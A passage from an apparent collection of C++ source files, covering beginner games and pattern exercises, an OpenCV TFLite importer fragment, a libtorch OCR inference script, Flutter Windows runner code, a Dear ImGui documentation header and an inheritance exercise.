;\n                        cout<<\"El valor del dado 1 es de :\"<<g<<\", el valor del dado 2 es de: \"<<h<<\". El valor final de los dados es de\"<<l<<endl;\n                        if (l == c) {\n                            cout<<\"Ganaste!\";}\n                        else {\n                            cout<<\"Perdiste.\";}\n                }\n            }}}\n        \n        else if (f == \"N\" or f == \"n\") {\n            cout<<\"Entiendo. Fin del juego.\";}\n        else {cout<<\"Caracter invalido.\";}\n    \n    return 0;}}\n",
    "#include<bits/stdc++.h>\nusing namespace std;\nvoid pattern1(int n) {\n    for(int i = 0; i<n; i++){\n        for(int j = 0; j<n; j++){\n            cout<<\"* \";\n        }\n        cout<<endl;\n    }\n}\n\nvoid pattern2(int n) {\n    for(int i = 0; i<n; i++){\n        for(int j = 0; j<=i; j++){\n            cout<<\"* \";\n        }\n        cout<<endl;\n    }\n}\n\nvoid pattern3(int n) {\n    for(int i = 1; i<=n; i++){\n        for(int j = 1; j<=i; j++){\n            cout<<j<<\" \";\n        }\n        cout<<endl;\n    }\n}\n\nvoid pattern4(int n) {\n    for(int i = 1; i<=n; i++){\n        for(int j = 1; j<=i; j++){\n            cout<<i<<\" \";\n        }\n        cout<<endl;\n    }\n}\n\nvoid pattern5(int n) {\n    for(int i = 1; i<=n; i++){\n        for(int j = n; j>=i; j--){\n            cout<<\"* \";\n        }\n        cout<<endl;\n    }\n}\n\nvoid pattern6(int n) {\n    for(int i = 1; i<=n; i++){\n        for(int j = 1; j<=n-i+1; j++){\n            cout<<j<<\" \";\n        }\n        cout<<endl;\n    }\n}\n\nvoid pattern7(int n) {\n    for(int i = 0; i<n; i++){\n        //space\n        for(int j=0; j<=n-i-1; j++){\n            cout<<\" \";\n        }\n        //star\n        for(int j=0; j<2*i+1; j++){\n            cout<<\"*\";\n        }\n        //space\n        for(int j=0; j<=n-i-1; j++){\n            cout<<\" \";\n        }\n        cout<<endl;\n    }\n}\n\nvoid pattern8(int n) {\n    for(int i = 0; i<=n; i++){\n        //space\n        for(int j=0; j<i; j++){\n            cout<<\" \";\n        }\n        //star\n        for(int j=0; j<2*n-(2*i + 1); j++){\n            cout<<\"*\";\n        }\n        //space\n        for(int j=0; j<i; j++){\n            cout<<\" \";\n        }\n        cout<<endl;\n    }\n}\n\nvoid pattern9(int n){\n    for(int i=1; i<=2*n-1; i++){\n        int stars=i;\n        if(i>n){\n            stars=2*n-i;\n        }\n        for(int j=1; j<=stars; j++){\n            cout<<\"*\";\n        }\n        cout<<endl;\n    }\n\n}\nint main(){\n    int t;\n    cin >> t;\n    for(int i = 0; i<t; i++){\n        int n;\n        cin >> n;\n        pattern9(n);\n    }\n    return 0;\n}",
    "// This file is part of OpenCV project.\n// It is subject to the license terms in the LICENSE file found in the top-level directory\n// of this distribution and at http://opencv.org/license.html.\n\n#include \"../precomp.hpp\"\n\n#ifdef HAVE_FLATBUFFERS\n#include \"schema_generated.h\"\n#include \"builtin_op_data.h\"\n#endif\n\n#include <opencv2/core/utils/logger.defines.hpp>\n#undef CV_LOG_STRIP_LEVEL\n#define CV_LOG_STRIP_LEVEL CV_LOG_LEVEL_VERBOSE + 1\n#include <opencv2/core/utils/logger.hpp>\n\nnamespace cv {\nnamespace dnn {\nCV__DNN_INLINE_NS_BEGIN\n\n#ifdef HAVE_FLATBUFFERS\n\nusing namespace opencv_tflite;\n\nclass TFLiteImporter {\npublic:\n    TFLiteImporter(Net& net, const char* modelBuffer, size_t bufSize);\n\nprivate:\n    const opencv_tflite::Model* model;\n    const flatbuffers::Vector<flatbuffers::Offset<opencv_tflite::Tensor> >* modelTensors;\n    std::map<int, Mat> allTensors;\n    Net& dstNet;\n\n    // This is a vector of pairs (layerId, outputId) where we iterate over\n    // indices from TFLite notation and get created OpenCV layers.\n    std::map<int, std::pair<int, int> > layerIds;\n\n    // Tracking of layouts for layers outputs.\n    std::vector<DataLayout> layouts;\n\n    void populateNet();\n\n    // Wrap TFLite Tensor to OpenCV Mat without data copying\n    Mat parseTensor(const Tensor& tensor);\n\n    typedef void (TFLiteImporter::*TFLiteImporterNodeParser)(const Operator&, const std::string&, LayerParams&);\n    typedef std::map<std::string, TFLiteImporterNodeParser> DispatchMap;\n\n    const DispatchMap dispatch;\n    static DispatchMap buildDispatchMap();\n\n    void parseConvolution(const Operator& op, const std::string& opcode, LayerParams& layerParams);\n    void parseDWConvolution(const Operator& op, const std::string& opcode, LayerParams& layerParams);\n    void parsePadding(const Operator& op, const std::string& opcode, LayerParams& layerParams);\n    void parseEltwise(const Operator& op, const std::string& opcode, LayerParams& layerParams);\n    void parsePooling(const Operator& op, const std::string& opcode, LayerParams& layerParams);\n    void parsePoolingWithArgmax(const Operator& op, const std::string& opcode, LayerParams& layerParams);\n    void parseUnpooling(const Operator& op, const std::string& opcode, LayerParams& layerParams);\n    void parseReshape(const Operator& op, const std::string& opcode, LayerParams& layerParams);\n    void parseConcat(const Operator& op, const std::string& opcode, LayerParams& layerParams);\n    void parsePack(const Operator& op, const std::string& opcode, LayerParams& layerParams);\n    void parseResize(const Operator& op, const std::string& opcode, LayerParams& layerParams);\n    void parseDeconvolution(const Operator& op, const std::string& opcode, LayerParams& layerParams);\n    void parseQuantize(const Operator& op, const std::string& opcode, LayerParams& layerParams);\n    void parseDequantize(const Operator& op, const std::string& opcode, LayerParams& layerParams);\n    void parseDetectionPostProcess(const Operator& op, const std::string& opcode, LayerParams& layerParams);\n    void parseActivation(const Operator& op, const std::string& opcode, LayerParams& layerParams);\n\n    void parseFusedActivation(const Operator& op, ActivationFunctionType activ);\n    void parseActivation(const Operator& op, const std::string& opcode, LayerParams& layerParams, bool isFused);\n    void addLayer(LayerParams& layerParams, const Operator& op);\n    int addPermuteLayer(const std::vector<int>& order, const std::string& permName, const std::pair<int, int>& inpId, int dtype);\n    int addReshapeLayer(const std::vector<int>& shape, int axis, int num_axes,\n                        const std::string& name, const std::pair<int, int>& inpId, int dtype);\n    inline bool isInt8(const Operator& op);\n    inline void getQuantParams(const Operator& op, float& inpScale, int& inpZero, float& outScale, int& outZero);\n};\n\nMat TFLiteImporter::parseTensor(const Tensor& tensor)\n{\n    const auto tensor_shape = tensor.shape();\n    CV_Assert(tensor_shape);\n    std::vector<int> shape(tensor_shape->begin(), tensor_shape->end());\n    int bufferIdx = tensor.buffer();\n    CV_Assert(bufferIdx != 0);  // 0th buffer is a no-data buffer\n    const Buffer* buffer = model->buffers()->Get(bufferIdx);\n    CV_Assert(buffer);\n    const auto buffer_data = buffer->data();\n    if (!buffer_data)\n        return Mat();\n\n    const void* data = buffer_data->data();\n\n    int dtype = -1;\n    switch (tensor.type()) {\n    case TensorType_FLOAT32:\n        dtype = CV_32F;\n        break;\n    case TensorType_INT32:\n        dtype = CV_32S;\n        break;\n    case TensorType_FLOAT16:\n        dtype = CV_16S;\n        break;\n    case TensorType_INT8:\n        dtype = CV_8S;\n        break;\n    default:\n        CV_Error(Error::StsNotImplemented, format(\"Parse tensor with type %s\", EnumNameTensorType(tensor.type())));\n    }\n    return Mat(shape, dtype, const_cast<void*>(data));\n}\n\nTFLiteImporter::TFLiteImporter(Net& dstNet, const char* modelBuffer, size_t bufSize)\n    : dstNet(dstN",
    "#include <torch/script.h> // One-stop header.\n#include <opencv2/opencv.hpp>\n#include \"tokenizer.h\"\n#include <iostream>\n#include <memory>\n#include <vector>\n#include <string>\n#include <unordered_map>\n#include <algorithm>\n#include <tuple>\n#include <chrono>\n#include <numeric>\n\nstd::string charset = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\\\"#$%&'()*+,-./:;<=>?@[\\\\]^_`{|}~\";\nTokenizer tokenizer(charset);\n\nconst std::string PATH = \"/home/anlab/hovduc/parseq-trace/parseq/test/0418/\";\ntorch::jit::script::Module module = torch::jit::load(\"/home/anlab/hovduc/parseq-trace/parseq.pt\");\n\nat::Tensor preprocess(cv::Mat& image) {\n    cv::resize(image, image, cv::Size(128, 32), cv::INTER_CUBIC);\n\n    CV_Assert(image.rows == 32 && image.cols == 128);\n    CV_Assert(image.type() == CV_8UC3);\n\n    // Convert the image from BGR to RGB and to float type\n    cv::Mat image_rgb;\n    cv::cvtColor(image, image_rgb, cv::COLOR_BGR2RGB);\n    image_rgb.convertTo(image_rgb, CV_32FC3, 1.0 / 255);\n\n    // Create a tensor from the image\n    at::Tensor im_tensor = torch::from_blob(image_rgb.data, {1, 32, 128, 3}, torch::kFloat);\n\n    // Permute the dimensions to match the shape (1, 3, 32, 128)\n    im_tensor = im_tensor.permute({0, 3, 1, 2});\n\n    // Normalize the tensor\n    std::vector<double> mean = {0.485, 0.456, 0.406};\n    std::vector<double> std_dev = {0.229, 0.224, 0.225};\n    im_tensor = torch::data::transforms::Normalize<>(mean, std_dev)(im_tensor);\n\n    return im_tensor.clone(); // Clone if the original tensor's data should be detached from the OpenCV Mat\n}\n\nstd::vector<std::string> get_data(std::string filename)\n{\n    std::ifstream gtruthData(filename);\n    std::vector<std::string> data;\n    std::string line;\n\n    if (gtruthData.is_open())\n    {\n        while (getline(gtruthData, line))\n        {\n            data.push_back(line);\n        }\n        gtruthData.close();\n    }\n    else\n    {\n        std::cerr << \"Unable to open file\" << std::endl;\n    }\n    return data;\n}\n\nint main(int argc, const char *argv[])\n{\n    int BATCH_SIZE = 1;\n    const std::string filename = \"/home/anlab/hovduc/parseq-trace/parseq/test/0418/test_gt.txt\";\n    std::vector<std::string> pathList;\n    std::vector<std::string> gtList;\n    std::vector<std::string> predList;\n\n\n    std::vector<std::string> dataset = get_data(filename);\n    for (const auto &line : dataset)\n    {\n        std::istringstream iss(line);\n        std::string path, gt;\n        if (std::getline(iss, path, '\\t') && std::getline(iss, gt, '\\t'))\n        {\n            pathList.push_back(path);\n            gtList.push_back(gt);\n        }\n    }\n    int num_batch = (pathList.size() + BATCH_SIZE - 1) / BATCH_SIZE;\n\n    for (int i = 0; i < num_batch; i++)\n    {\n        std::vector<at::Tensor> images;\n        int batch_start = i * BATCH_SIZE;\n        int batch_end = std::min((i + 1) * BATCH_SIZE, (int)pathList.size());\n\n        for (int j = batch_start; j < batch_end; ++j)\n        {\n            cv::Mat image = cv::imread(PATH + pathList[j]);\n            at::Tensor tensor = preprocess(image);\n\n            // Create a vector of IValues and add the tensor to the vector\n            images.push_back(tensor);\n        }\n        auto images_concat = torch::cat(images, 0);\n        at::Tensor outputs = module.forward({images_concat}).toTensor();\n        auto detached_token_dists = outputs.detach();\n        \n        // Zero out specific token distributions\n        detached_token_dists = detached_token_dists.index_put_({torch::indexing::Ellipsis, torch::indexing::Slice(11, 74)}, torch::zeros({detached_token_dists.size(0), detached_token_dists.size(1), 63}));\n        detached_token_dists = detached_token_dists.index_put_({torch::indexing::Ellipsis, torch::indexing::Slice(75, 76)}, torch::zeros({detached_token_dists.size(0), detached_token_dists.size(1), 1}));\n        detached_token_dists = detached_token_dists.index_put_({torch::indexing::Ellipsis, torch::indexing::Slice(77, torch::indexing::None)}, torch::zeros({detached_token_dists.size(0), detached_token_dists.size(1), detached_token_dists.size(2) - 77}));\n\n        // Predict tokens\n        auto [tokens, probs] = tokenizer.decode(detached_token_dists, false, true);\n        std::replace(tokens.begin(), tokens.end(), \",\", \".\");\n\n        predList.push_back(tokens[0]);\n    }\n\n    std::ofstream outfile;\n    outfile.open(\"../predict.txt\", std::ios_base::app);\n    for (int i = 0; i < pathList.size(); i++)\n    {\n        std::string text = pathList[i] + \"\\t\" + gtList[i] + \"\\t\" + predList[i] + \"\\n\";\n        outfile << text;\n    }\n    return 0;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  unsigned int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <flutter/dart_project.h>\r\n#include <flutter/flutter_view_controller.h>\r\n#include <windows.h>\r\n\r\n#include \"flutter_window.h\"\r\n#include \"utils.h\"\r\n\r\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\r\n                      _In_ wchar_t *command_line, _In_ int show_command) {\r\n  // Attach to console when present (e.g., 'flutter run') or create a\r\n  // new console when running with a debugger.\r\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\r\n    CreateAndAttachConsole();\r\n  }\r\n\r\n  // Initialize COM, so that it is available for use in the library and/or\r\n  // plugins.\r\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\r\n\r\n  flutter::DartProject project(L\"data\");\r\n\r\n  std::vector<std::string> command_line_arguments =\r\n      GetCommandLineArguments();\r\n\r\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\r\n\r\n  FlutterWindow window(project);\r\n  Win32Window::Point origin(10, 10);\r\n  Win32Window::Size size(1280, 720);\r\n  if (!window.Create(L\"sanya_5\", origin, size)) {\r\n    return EXIT_FAILURE;\r\n  }\r\n  window.SetQuitOnClose(true);\r\n\r\n  ::MSG msg;\r\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\r\n    ::TranslateMessage(&msg);\r\n    ::DispatchMessage(&msg);\r\n  }\r\n\r\n  ::CoUninitialize();\r\n  return EXIT_SUCCESS;\r\n}\r\n",
    "\ufeff#include <iostream>\n#include <string>\n\nclass Protocol {\nprotected:\n    Protocol* nextProtocol_ = nullptr;\n\npublic:\n    virtual ~Protocol() = default;\n\n    void SetNextProtocol(Protocol* nextProtocol) {\n        nextProtocol_ = nextProtocol;\n    }\n\n    virtual void Send(const std::string& data) = 0;\n    virtual void Receive(const std::string& data) = 0;\n};\n\nclass ConcreteProtocolA : public Protocol {\npublic:\n    void Send(const std::string& data) override {\n        std::cout << \"ProtocolA \u043d\u0430\u0434\u0441\u0438\u043b\u0430\u0454: \" << data << std::endl;\n        if (nextProtocol_) nextProtocol_->Send(data);\n    }\n\n    void Receive(const std::string& data) override {\n        std::cout << \"ProtocolA \u043e\u0442\u0440\u0438\u043c\u0443\u0454: \" << data << std::endl;\n        if (nextProtocol_) nextProtocol_->Receive(data);\n    }\n};\n\nclass ConcreteProtocolB : public Protocol {\npublic:\n    void Send(const std::string& data) override {\n        std::cout << \"ProtocolB \u043d\u0430\u0434\u0441\u0438\u043b\u0430\u0454: \" << data << std::endl;\n        if (nextProtocol_) nextProtocol_->Send(data);\n    }\n\n    void Receive(const std::string& data) override {\n        std::cout << \"ProtocolB \u043e\u0442\u0440\u0438\u043c\u0443\u0454: \" << data << std::endl;\n        if (nextProtocol_) nextProtocol_->Receive(data);\n    }\n};\n\nint main() {\n    ConcreteProtocolA protocolA;\n    ConcreteProtocolB protocolB;\n    protocolA.SetNextProtocol(&protocolB);\n\n    protocolA.Send(\"Hello\");\n    protocolA.Receive(\"World\");\n\n    return 0;\n}\n",
    "// dear imgui, v1.85 WIP\n// (main code and documentation)\n\n// Help:\n// - Read FAQ at http://dearimgui.org/faq\n// - Newcomers, read 'Programmer guide' below for notes on how to setup Dear ImGui in your codebase.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// Read imgui.cpp for details, links and comments.\n\n// Resources:\n// - FAQ                   http://dearimgui.org/faq\n// - Homepage & latest     \n// ://github.com/ocornut/imgui\n// - Releases & changelog  https://github.com/ocornut/imgui/releases\n// - Gallery               https://github.com/ocornut/imgui/issues/4451 (please post your screenshots/video there!)\n// - Wiki                  https://github.com/ocornut/imgui/wiki (lots of good stuff there)\n// - Glossary              https://github.com/ocornut/imgui/wiki/Glossary\n// - Issues & support      https://github.com/ocornut/imgui/issues\n\n// Getting Started?\n// - For first-time users having issues compiling/linking/running or issues loading fonts:\n//   please post in https://github.com/ocornut/imgui/discussions if you cannot find a solution in resources above.\n\n// Developed by Omar Cornut and every direct or indirect contributors to the GitHub.\n// See LICENSE.txt for copyright and licensing details (standard MIT License).\n// This library is free but needs your support to sustain development and maintenance.\n// Businesses: you can support continued development via invoiced technical support, maintenance and sponsoring contracts. Please reach out to \"contact AT dearimgui.com\".\n// Individuals: you can support continued development via donations. See docs/README or web page.\n\n// It is recommended that you don't modify imgui.cpp! It will become difficult for you to update the library.\n// Note that 'ImGui::' being a namespace, you can add functions into the namespace from your own source files, without\n// modifying imgui.h or imgui.cpp. You may include imgui_internal.h to access internal data structures, but it doesn't\n// come with any guarantee of forward compatibility. Discussing your changes on the GitHub Issue Tracker may lead you\n// to a better solution or official support for them.\n\n/*\n\nIndex of this file:\n\nDOCUMENTATION\n\n- MISSION STATEMENT\n- END-USER GUIDE\n- PROGRAMMER GUIDE\n  - READ FIRST\n  - HOW TO UPDATE TO A NEWER VERSION OF DEAR IMGUI\n  - GETTING STARTED WITH INTEGRATING DEAR IMGUI IN YOUR CODE/ENGINE\n  - HOW A SIMPLE APPLICATION MAY LOOK LIKE\n  - HOW A SIMPLE RENDERING FUNCTION MAY LOOK LIKE\n  - USING GAMEPAD/KEYBOARD NAVIGATION CONTROLS\n- API BREAKING CHANGES (read me when you update!)\n- FREQUENTLY ASKED QUESTIONS (FAQ)\n  - Read all answers online: https://www.dearimgui.org/faq, or in docs/FAQ.md (with a Markdown viewer)\n\nCODE\n(search for \"[SECTION]\" in the code to find them)\n\n// [SECTION] INCLUDES\n// [SECTION] FORWARD DECLARATIONS\n// [SECTION] CONTEXT AND MEMORY ALLOCATORS\n// [SECTION] USER FACING STRUCTURES (ImGuiStyle, ImGuiIO)\n// [SECTION] MISC HELPERS/UTILITIES (Geometry functions)\n// [SECTION] MISC HELPERS/UTILITIES (String, Format, Hash functions)\n// [SECTION] MISC HELPERS/UTILITIES (File functions)\n// [SECTION] MISC HELPERS/UTILITIES (ImText* functions)\n// [SECTION] MISC HELPERS/UTILITIES (Color functions)\n// [SECTION] ImGuiStorage\n// [SECTION] ImGuiTextFilter\n// [SECTION] ImGuiTextBuffer\n// [SECTION] ImGuiListClipper\n// [SECTION] STYLING\n// [SECTION] RENDER HELPERS\n// [SECTION] MAIN CODE (most of the code! lots of stuff, needs tidying up!)\n// [SECTION] ERROR CHECKING\n// [SECTION] LAYOUT\n// [SECTION] SCROLLING\n// [SECTION] TOOLTIPS\n// [SECTION] POPUPS\n// [SECTION] KEYBOARD/GAMEPAD NAVIGATION\n// [SECTION] DRAG AND DROP\n// [SECTION] LOGGING/CAPTURING\n// [SECTION] SETTINGS\n// [SECTION] VIEWPORTS\n// [SECTION] PLATFORM DEPENDENT HELPERS\n// [SECTION] METRICS/DEBUGGER WINDOW\n\n*/\n\n//-----------------------------------------------------------------------------\n// DOCUMENTATION\n//-----------------------------------------------------------------------------\n\n/*\n\n MISSION STATEMENT\n =================\n\n - Easy to use to create code-driven and data-driven tools.\n - Easy to use to create ad hoc short-lived tools and long-lived, more elaborate tools.\n - Easy to hack and improve.\n - Minimize setup and maintenance.\n - Minimize state storage on user side.\n - Portable, minimize dependencies, run on target (consoles, phones, etc.).\n - Efficient runtime and memory consumption.\n\n Designed for developers and content-creators, not the typical end-user! Some of the current weaknesses includes:\n\n - Doesn't look fancy, doesn't animate.\n - Limited layout features, intricate layouts are typically crafted in code.\n\n\n END-USER GUIDE\n ==============\n\n - Double-click on title bar to collapse window.\n - Click upper right corner to close a window, available when 'bool* p_open' is passed to ImGui::Begin().\n - Click and drag on lower right corner to resize window (double-click to auto fit window to its contents).\n - Click and drag on any empty space to move window.",
    "#include <iostream>\n#include <clocale>\n#include <string>\nusing namespace std;\n\nstring kullanici1, kullanici2, kelime, gizlikelime;\nchar tahmin;\nint yanlis = 0;\n\nint main()\n{\n\tsetlocale(LC_ALL, \"Turkish\");\n\n\tcout << \"----/ ADAM ASMACA OYUNUMUZA HOSGELDINIZ /----\" << endl;\n\tcout << endl;\n\tcout << endl;\n\n\tcout << \"birinci oyuncunun ismi = \" << \" \"; cin >> kullanici1;\n\tcout << \"ikinci oyuncunun ismi = \" << \" \"; cin >> kullanici2;\n\n\tcout << kullanici1 << \" \" << \"lutfen\" << \" \" << kullanici2 << \" \" << \" kisinin tahmin edecegi bir kelime giriniz = \" << endl;\n\tcin >> kelime ;\n\n\twhile (gizlikelime.size() != kelime.size())\n\t{\n\t\tgizlikelime.push_back('?');                   //gizli kelime kelimeye esit olmad\u00fdg\u00fd s\u00fcrece ? kalsin kelime yerine.\n\t}\n\t\n\tfor (int i = 0; i <= 30; i++)\n\t{\n\t\tcout << endl;                                // kelimeyi aldiktan sonra 30 satir bosluk istedim kelime gorunmesin diye.\n\t}\n\t\n\tcout << \"// GIRILEN KELIME GOZUKMESIN DIYE BOSLUK BIRAKILDI // \" << endl;    // 2. kullanici bosluga sasirmasin diye bildiri.\n\n\tdo\n\t{\n\t\tcout << \"bulunan harfler = \" << \" \" << gizlikelime << endl;          //gizli  kelime bulunmasi istenen kelime\n\t\tcout << \"tahmininizi giriniz = \" << \" \"; cin >> tahmin;              //gizli  kelimeyi tahmin etti\u00f0imiz bolum\n\n\t\tint x = kelime.length();                                  //kelimenin uzunlugu ne kadar.\n\t\tfor (int i = 0; i < x; i++)                           // 0'dan baslayip girilen kelime harf sayisina kadar devam etsin.\n\t\t{\n\t\t\tif (tahmin == kelime[i])                         //i kelime sayisi kadar teker teker artacak ; tahminde kelimedeki harfleri aricak esitse-\n\t\t\t{\n\t\t\t\tgizlikelime[i] = tahmin;                    // gizli kelimede edilen tahmine e\u00feittir.\n\t\t\t\tyanlis--;                                   // her dogru tahminde yanlis hakki azalsin\n\t\t\t}\n\t\t}\n\t\tyanlis++;                        // aksi tahminde yanlis hakki artsin (12'ye kadar)\n\n\t\tif (gizlikelime == kelime)                 //tahmin kelimesi e\u00feitse girilen kelimeye oyunu kazansin\n\t\t{\n\t\t\tcout << \"*** OYUNU KAZANDINIZ ***\" << endl;\n\t\t\tbreak;\n\t\t}\n\n\t\t\tif (yanlis == 1)\n\t\t\t{\n\t\t\t\tcout << \"                \\n\";\n\t\t\t\tcout << \"                \\n\";\n\t\t\t\tcout << \"                \\n\";                      //yanlis artt\u00fdkca asilan adam resmi cizilsin \n\t\t\t\tcout << \"                \\n\";\n\t\t\t\tcout << \"                \\n\";\n\t\t\t\tcout << \"                \\n\";\n\t\t\t\tcout << \" __             \\n\";\n\t\t\t}\n\t\t\telse if (yanlis == 2)\n\t\t\t{\n\t\t\t\tcout << \"                \\n\";\n\t\t\t\tcout << \"                \\n\";\n\t\t\t\tcout << \"                \\n\";\n\t\t\t\tcout << \"                \\n\";\n\t\t\t\tcout << \"|               \\n\";\n\t\t\t\tcout << \"|               \\n\";\n\t\t\t\tcout << \"|__             \\n\";\n\t\t\t}\n\t\t\telse if (yanlis == 3)\n\t\t\t{\n\t\t\t\tcout << \"                \\n\";\n\t\t\t\tcout << \"|               \\n\";\n\t\t\t\tcout << \"|               \\n\";\n\t\t\t\tcout << \"|               \\n\";\n\t\t\t\tcout << \"|               \\n\";\n\t\t\t\tcout << \"|               \\n\";\n\t\t\t\tcout << \"|__             \\n\";\n\t\t\t}\n\t\t\telse if (yanlis == 4)\n\t\t\t{\n\t\t\t\tcout << \" __             \\n\";\n\t\t\t\tcout << \"|               \\n\";\n\t\t\t\tcout << \"|               \\n\";\n\t\t\t\tcout << \"|               \\n\";\n\t\t\t\tcout << \"|               \\n\";\n\t\t\t\tcout << \"|               \\n\";\n\t\t\t\tcout << \"|               \\n\";\n\t\t\t\tcout << \"|__             \\n\";\n\t\t\t}\n\t\t\telse if (yanlis == 5)\n\t\t\t{\n\t\t\t\tcout << \" ________       \\n\";\n\t\t\t\tcout << \"|               \\n\";\n\t\t\t\tcout << \"|               \\n\";\n\t\t\t\tcout << \"|               \\n\";\n\t\t\t\tcout << \"|               \\n\";\n\t\t\t\tcout << \"|               \\n\";\n\t\t\t\tcout << \"|               \\n\";\n\t\t\t\tcout << \"|__             \\n\";\n\t\t\t}\n\t\t\telse if (yanlis == 6)\n\t\t\t{\n\t\t\t\tcout << \" ________       \\n\";\n\t\t\t\tcout << \"|      ( )      \\n\";\n\t\t\t\tcout << \"|               \\n\";\n\t\t\t\tcout << \"|               \\n\";\n\t\t\t\tcout << \"|               \\n\";\n\t\t\t\tcout << \"|               \\n\";\n\t\t\t\tcout << \"|               \\n\";\n\t\t\t\tcout << \"|__             \\n\";\n\t\t\t}\n\t\t\telse if (yanlis == 7)\n\t\t\t{\n\t\t\t\tcout << \" ________       \\n\";\n\t\t\t\tcout << \"|      ( )      \\n\";\n\t\t\t\tcout << \"|       |       \\n\";\n\t\t\t\tcout << \"|       |       \\n\";\n\t\t\t\tcout << \"|               \\n\";\n\t\t\t\tcout << \"|               \\n\";\n\t\t\t\tcout << \"|               \\n\";\n\t\t\t\tcout << \"|__             \\n\";\n\t\t\t}\n\t\t\telse if (yanlis == 8)\n\t\t\t{\n\t\t\t\tcout << \" ________       \\n\";\n\t\t\t\tcout << \"|      ( )      \\n\";\n\t\t\t\tcout << \"|       |       \\n\";\n\t\t\t\tcout << \"|       |       \\n\";\n\t\t\t\tcout << \"|       |       \\n\";\n\t\t\t\tcout << \"|       |       \\n\";\n\t\t\t\tcout << \"|               \\n\";\n\t\t\t\tcout << \"|__             \\n\";\n\t\t\t}\n\t\t\telse if (yanlis == 9)\n\t\t\t{\n\t\t\t\tcout << \" ________       \\n\";\n\t\t\t\tcout << \"|      ( )      \\n\";\n\t\t\t\tcout << \"|       |       \\n\";\n\t\t\t\tcout << \"|      /|       \\n\";\n\t\t\t\tcout << \"|       |       \\n\";\n\t\t\t\tcout << \"|       |       \\n\";\n\t\t\t\tcout << \"|               \\n\";\n\t\t\t\tcout << \"|__             \\n\";\n\t\t\t}\n\t\t\telse if (yanlis == 10)\n\t\t\t{\n\t\t\t\tcout << \" ________       \\n\";\n\t\t\t\tcout << \"|      ( )      \\n\";\n\t\t\t\tcout << \"|       |       \\n\";\n\t\t\t\tcout << \"|      /|\\\\     \\n\";\n\t\t\t\tcout << \"|       |       \\n\";\n",
    "#include <print>\n#include <string>\n\nclass Vehicle\n{\nprivate:\n    std::string model;\n    int wheels;\n    int doors;\n    int color; // 0 - black, 1 - red, 2 - blue, 3 - green, 4 - white\n\npublic:\n    Vehicle(std::string _model, int _wheels, int _doors, int _color)\n        : model(std::move(_model)), wheels(_wheels), doors(_doors), color(_color)\n    {\n        std::print(\"{} with {} wheels, {} doors and color of {}\\n\", model, wheels, doors, color);\n    }\n    auto get_doors() const { return doors; }\n};\n\n/* Starship uses constructrs from the base Vehicle class.\n */\nclass Starship : public Vehicle\n{\npublic:\n    using Vehicle::Vehicle;\n};\n\n/* Car can have aditional ifno about gear type.\n */\nclass Automobile : public Vehicle\n{\nprivate:\n    bool automatic_gear{false};\n\npublic:\n    Automobile(std::string _model, int _wheels, int _doors, int _color, bool _automatic_gear)\n        : Vehicle(_model, _wheels, _doors, _color), automatic_gear(_automatic_gear)\n    {\n        std::print(\"  Does it have automatic gear? {}\\n\", automatic_gear ? \"Yes, it has!\" : \"No, it hasn't.\");\n    }\n\n    auto has_automatic_gear() const { return automatic_gear; }\n};\n\n/* Bike can have gear or not.\n */\nclass Bike : public Vehicle\n{\nprivate:\n    bool gears{false};\n\npublic:\n    Bike(std::string _model, int _color, bool _gears) : Vehicle(_model, 2, 0, _color), gears(_gears)\n    {\n        std::print(\"  Does it have gears? {}\\n\", gears ? \"Yes, it has!\" : \"No, it hasn't.\");\n    }\n    Bike(std::string _model, bool _has_gears) : Bike(_model, 1, _has_gears) {}\n};\n\n/* Base abstract class for the engine kind.\n */\nclass Engine\n{\npublic:\n    virtual auto start_engine() const -> std::string = 0;\n};\n\n/* Diesel engine.\n */\nclass Diesel : public Engine\n{\n};\n\n/* Gasoline engine.\n */\nclass Gasoline : public Engine\n{\n};\n\n/* Electric engine.\n */\nclass Electric : public Engine\n{\n};\n\nclass Truck : public Automobile, public Diesel\n{\n};\n\nclass Car : public Automobile, public Gasoline\n{\n};\n\nclass ElectricCar : public Automobile, public Electric\n{\n};\n\nclass HybridCar : public Car, public ElectricCar\n{\n};\n\n/*\n * Dla kazdego zadania przypisana jest jedna dyrektywa preprocesora. Zmie\u0144 jej wartos\u0107 z 0 na 1 aby j\u0105 